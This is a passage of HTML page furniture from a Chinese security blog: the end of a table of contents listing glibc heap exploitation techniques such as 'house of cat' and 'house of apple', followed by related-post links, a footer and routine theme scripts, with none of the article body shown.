href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">12.0.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E5%8F%AF%E8%83%BD%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">12.0.4.</span> <span class="toc-text">实操可能的问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat"><span class="toc-number">13.</span> <span class="toc-text">house of cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">13.0.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">13.0.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE%E7%BB%93%E6%9E%84%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">13.0.2.1.</span> <span class="toc-text">IO_FILE结构及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable%E6%A3%80%E6%9F%A5"><span class="toc-number">13.0.2.2.</span> <span class="toc-text">vtable检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#malloc-assert%E4%B8%8EFSOP"><span class="toc-number">13.0.2.3.</span> <span class="toc-text">__malloc_assert与FSOP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E7%A7%8D%E5%8F%AF%E8%A1%8C%E7%9A%84IO%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">13.0.2.4.</span> <span class="toc-text">一种可行的IO调用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fake-IO%E7%BB%93%E6%9E%84%E4%BD%93%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-number">13.0.2.5.</span> <span class="toc-text">fake_IO结构体需要绕过的检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">13.0.3.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">13.0.3.1.</span> <span class="toc-text">模板</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple1"><span class="toc-number">14.</span> <span class="toc-text">house of apple1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">15.</span> <span class="toc-text">house of apple2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple3"><span class="toc-number">16.</span> <span class="toc-text">house of apple3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">17.</span> <span class="toc-text">house of botcake</span></a></li></ol></div></div><div class="card-widget card-recommend-post"><div class="item-headline"><i class="fas fa-dharmachakra"></i><span>相关推荐</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/21638/" title="FCTF"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" alt="FCTF"></a><div class="content"><a class="title" href="/posts/21638/" title="FCTF">FCTF</a><time datetime="2023-04-18" title="发表于 2023-04-18">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1518/" title="file虚函数学习"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg" alt="file虚函数学习"></a><div class="content"><a class="title" href="/posts/1518/" title="file虚函数学习">file虚函数学习</a><time datetime="2023-10-19" title="发表于 2023-10-19">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/35200/" title="ida伪代码生成失败应对"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg" alt="ida伪代码生成失败应对"></a><div class="content"><a class="title" href="/posts/35200/" title="ida伪代码生成失败应对">ida伪代码生成失败应对</a><time datetime="2023-06-26" title="发表于 2023-06-26">2023-06-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>